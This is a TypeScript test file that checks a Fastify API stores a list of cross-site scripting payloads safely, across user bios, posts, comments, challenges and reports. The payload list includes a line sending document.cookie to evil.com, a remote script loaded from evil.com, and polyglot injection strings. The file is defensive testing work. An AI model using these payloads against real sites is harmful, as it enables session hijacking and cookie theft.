import { describe, it, expect, beforeEach, afterAll } from 'vitest';
import type { FastifyInstance } from 'fastify';
import { buildTestApp, generateTestToken, parseBody } from '../setup/app.js';
import { factories } from '../setup/fixtures.js';

describe('XSS Security', () => {
  let app: FastifyInstance;
  let user: { id: string; username: string };
  let token: string;

  // Comprehensive XSS payloads to test
  const xssPayloads = [
    // Basic script injection
    '<script>alert("XSS")</script>',
    '<script>document.location="http://evil.com/steal?c="+document.cookie</script>',
    '<script src="http://evil.com/xss.js"></script>',

    // Event handlers
    '<img src=x onerror=alert("XSS")>',
    '<img src="x" onerror="alert(\'XSS\')">',
    '<svg onload=alert("XSS")>',
    '<body onload=alert("XSS")>',
    '<div onmouseover="alert(\'XSS\')">hover me</div>',
    '<input onfocus=alert("XSS") autofocus>',
    '<marquee onstart=alert("XSS")>',
    '<video><source onerror="alert(\'XSS\')">',

    // JavaScript URIs
    '<a href="javascript:alert(\'XSS\')">Click</a>',
    '<iframe src="javascript:alert(\'XSS\')">',
    '<form action="javascript:alert(\'XSS\')"><input type="submit">',

    // Data URIs
    '<a href="data:text/html,<script>alert(\'XSS\')</script>">Click</a>',
    '<object data="data:text/html,<script>alert(\'XSS\')</script>">',

    // Breaking out of attributes
    '"><script>alert("XSS")</script>',
    '\' onclick=alert("XSS") \'',
    '" onmouseover="alert(\'XSS\')" "',

    // SVG-based attacks
    '<svg><script>alert("XSS")</script></svg>',
    '<svg><animate onbegin=alert("XSS")>',
    '<svg><set onbegin=alert("XSS")>',

    // CSS injection
    '<style>body{background:url("javascript:alert(\'XSS\')")}</style>',
    '<div style="background:url(javascript:alert(\'XSS\'))">',

    // Encoded attacks
    '&#60;script&#62;alert("XSS")&#60;/script&#62;',
    '%3Cscript%3Ealert("XSS")%3C/script%3E',
    '\\x3cscript\\x3ealert("XSS")\\x3c/script\\x3e',

    // Template injection
    '{{constructor.constructor("alert(1)")()}}',
    '${alert(1)}',
    '#{alert(1)}',

    // Unicode bypass attempts
    '<scrıpt>alert("XSS")</scrıpt>',
    '<img src=x onerror=\u0061lert("XSS")>',

    // Comment breaking
    '<!--<script>alert("XSS")</script>-->',
    '--><script>alert("XSS")</script><!--',

    // Null byte injection
    '<scr\x00ipt>alert("XSS")</script>',

    // Mixed case
    '<ScRiPt>alert("XSS")</sCrIpT>',
    '<IMG SRC=x OnErRoR=alert("XSS")>',
  ];

  beforeEach(async () => {
    app = await buildTestApp({ withRoutes: true });
    await app.ready();
    user = await factories.createUser();
    token = generateTestToken(app, { userId: user.id, username: user.username });
  });

  afterAll(async () => {
    await app.close();
  });

  describe('User profile bio', () => {
    it('should safely store XSS payloads in bio', async () => {
      for (const payload of xssPayloads.slice(0, 10)) {
        const response = await app.inject({
          method: 'PATCH',
          url: '/users/me',
          headers: { Authorization: `Bearer ${token}` },
          payload: { bio: payload },
        });

        expect(response.statusCode).toBe(200);

        // Verify payload is stored as-is (escaping happens on frontend)
        const getResponse = await app.inject({
          method: 'GET',
          url: `/users/${user.username}`,
        });

        const body = parseBody<{ bio: string }>(getResponse);
        // API should return raw content; frontend handles escaping
        expect(body.bio).toBe(payload);
      }
    });
  });

  describe('User display name', () => {
    it('should safely store XSS payloads in display name', async () => {
      for (const payload of xssPayloads.slice(0, 5)) {
        const response = await app.inject({
          method: 'PATCH',
          url: '/users/me',
          headers: { Authorization: `Bearer ${token}` },
          payload: { displayName: payload.slice(0, 100) }, // Respect max length
        });

        expect(response.statusCode).toBe(200);
      }
    });
  });

  describe('Shot prompts and captions', () => {
    it('should safely store XSS payloads in prompts', async () => {
      for (const payload of xssPayloads) {
        const response = await app.inject({
          method: 'POST',
          url: '/shots',
          headers: {
            Authorization: `Bearer ${token}`,
            'Content-Type': 'application/json',
          },
          payload: {
            prompt: payload,
            imageUrl: 'https://example.com/img.png',
            imageKey: 'test.png',
          },
        });

        expect(response.statusCode).toBe(201);

        const body = parseBody<{ prompt: string }>(response);
        expect(body.prompt).toBe(payload);
      }
    });

    it('should safely store XSS payloads in captions', async () => {
      for (const payload of xssPayloads.slice(0, 10)) {
        const response = await app.inject({
          method: 'POST',
          url: '/shots',
          headers: {
            Authorization: `Bearer ${token}`,
            'Content-Type': 'application/json',
          },
          payload: {
            prompt: 'Test prompt',
            imageUrl: 'https://example.com/img.png',
            imageKey: 'test.png',
            caption: payload,
          },
        });

        expect(response.statusCode).toBe(201);

        const body = parseBody<{ caption: string }>(response);
        expect(body.caption).toBe(payload);
      }
    });
  });

  describe('Comments', () => {
    it('should safely store XSS payloads in comments', async () => {
      const shot = await factories.createShot(user.id);

      for (const payload of xssPayloads) {
        const response = await app.inject({
          method: 'POST',
          url: `/shots/${shot.id}/comments`,
          headers: { Authorization: `Bearer ${token}` },
          payload: { content: payload },
        });

        expect(response.statusCode).toBe(201);
      }

      // Verify all comments stored correctly
      const getResponse = await app.inject({
        method: 'GET',
        url: `/shots/${shot.id}/comments`,
      });

      expect(getResponse.statusCode).toBe(200);
      const body = parseBody<{ comments: Array<{ content: string }> }>(getResponse);

      // Check that payloads are stored verbatim
      for (const payload of xssPayloads) {
        expect(body.comments.some((c) => c.content === payload)).toBe(true);
      }
    });
  });

  describe('Challenge content', () => {
    let adminUser: { id: string; username: string };
    let adminToken: string;

    beforeEach(async () => {
      adminUser = await factories.createUser({ isAdmin: true });
      adminToken = generateTestToken(app, { userId: adminUser.id, username: adminUser.username });
    });

    it('should safely store XSS payloads in challenge title', async () => {
      for (const payload of xssPayloads.slice(0, 5)) {
        const response = await app.inject({
          method: 'POST',
          url: '/challenges',
          headers: {
            Authorization: `Bearer ${adminToken}`,
            'Content-Type': 'application/json',
          },
          payload: {
            title: payload.slice(0, 255),
            startsAt: new Date().toISOString(),
            endsAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString(),
          },
        });

        expect(response.statusCode).toBe(201);
      }
    });

    it('should safely store XSS payloads in challenge description', async () => {
      for (const payload of xssPayloads.slice(0, 5)) {
        const response = await app.inject({
          method: 'POST',
          url: '/challenges',
          headers: {
            Authorization: `Bearer ${adminToken}`,
            'Content-Type': 'application/json',
          },
          payload: {
            title: 'Test Challenge',
            description: payload,
            startsAt: new Date().toISOString(),
            endsAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString(),
          },
        });

        expect(response.statusCode).toBe(201);
      }
    });
  });

  describe('Report details', () => {
    it('should safely store XSS payloads in report details', async () => {
      const reportedUser = await factories.createUser();

      for (const payload of xssPayloads.slice(0, 5)) {
        const response = await app.inject({
          method: 'POST',
          url: '/reports',
          headers: { Authorization: `Bearer ${token}` },
          payload: {
            reportedUserId: reportedUser.id,
            reason: 'other',
            details: payload,
          },
        });

        expect(response.statusCode).toBe(201);
      }
    });
  });

  describe('Content-Type header validation', () => {
    it('should not interpret HTML content-type for API responses', async () => {
      const shot = await factories.createShot(user.id, {
        prompt: '<script>alert("XSS")</script>',
      });

      const response = await app.inject({
        method: 'GET',
        url: `/shots/${shot.id}`,
      });

      // Response should always be JSON, not HTML
      expect(response.headers['content-type']).toContain('application/json');
    });
  });

  describe('URL parameter encoding', () => {
    it('should handle XSS in URL parameters safely', async () => {
      const xssUrls = [
        '/users/<script>alert("XSS")</script>',
        '/shots?cursor=<script>alert("XSS")</script>',
        '/tags/<img src=x onerror=alert(1)>/shots',
      ];

      for (const url of xssUrls) {
        const response = await app.inject({
          method: 'GET',
          url: encodeURI(url),
        });

        // Should not cause server error
        expect(response.statusCode).not.toBe(500);
        // Response should be JSON
        expect(response.headers['content-type']).toContain('application/json');
      }
    });
  });

  describe('JSON response escaping', () => {
    it('should properly escape special characters in JSON response', async () => {
      const specialChars = [
        'Test\nwith\nnewlines',
        'Test\twith\ttabs',
        'Test with "quotes"',
        'Test with \\backslashes\\',
        'Test with </script> tag',
        'Test with \u0000 null byte',
      ];

      for (const content of specialChars) {
        const response = await app.inject({
          method: 'POST',
          url: '/shots',
          headers: {
            Authorization: `Bearer ${token}`,
            'Content-Type': 'application/json',
          },
          payload: {
            prompt: content,
            imageUrl: 'https://example.com/img.png',
            imageKey: 'test.png',
          },
        });

        expect(response.statusCode).toBe(201);

        // Verify JSON is valid
        expect(() => JSON.parse(response.body)).not.toThrow();
      }
    });
  });

  describe('Polyglot payloads', () => {
    const polyglotPayloads = [
      // JavaScript + HTML polyglot
      'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
      // SQL + XSS polyglot
      '\'; alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\\";alert(String.fromCharCode(88,83,83))//--></script>">\'><script>alert(String.fromCharCode(88,83,83))</script>',
    ];

    it('should safely store polyglot payloads', async () => {
      for (const payload of polyglotPayloads) {
        const response = await app.inject({
          method: 'POST',
          url: '/shots',
          headers: {
            Authorization: `Bearer ${token}`,
            'Content-Type': 'application/json',
          },
          payload: {
            prompt: payload,
            imageUrl: 'https://example.com/img.png',
            imageKey: 'test.png',
          },
        });

        // Should either succeed in storing or reject with validation error
        // but never cause server error
        expect(response.statusCode).not.toBe(500);
      }
    });
  });
});
